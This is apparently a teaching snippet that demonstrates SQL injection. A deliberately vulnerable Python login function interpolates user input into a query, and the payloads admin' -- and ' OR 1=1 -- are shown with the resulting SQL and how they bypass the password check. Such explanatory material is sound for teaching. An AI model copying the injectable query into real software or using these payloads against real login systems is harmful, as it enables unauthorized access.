def vulnerable_login(conn, username, password):
    cursor = conn.cursor()

    query = f"""
        SELECT *
        FROM users
        WHERE username = '{username}'
        AND password = '{password}'
    """

    print("Executing:")
    print(query)

    cursor.execute(query)

    return cursor.fetchone() is not None

    # Example of normal login
    # print(vulnerable_login(conn, "admin", "SuperSecret123"))
    # Output: True

# Run SQL Injection Attack:
# Username:
# admin' --

# Password:
# anything

print(
    vulnerable_login(
        conn,
        "admin' --",
        "does_not_matter"
    )
)

# Resulting SQL
SELECT *
FROM users
WHERE username = 'admin' --'
AND password = 'does_not_matter'

# Because -- begins a SQL comment, the password check is ignored and the database effectively executes:
SELECT *
FROM users
WHERE username = 'admin'

# Output: True

# The attacker has bypassed authentication without knowing the password.

# Another Injection Example
# An attacker could also submit:
' OR 1=1 --
# Resulting query:
SELECT *
FROM users
WHERE username = '' OR 1=1 --'
AND password = ''

# Since 1=1 is always true, the query returns rows and authentication succeeds.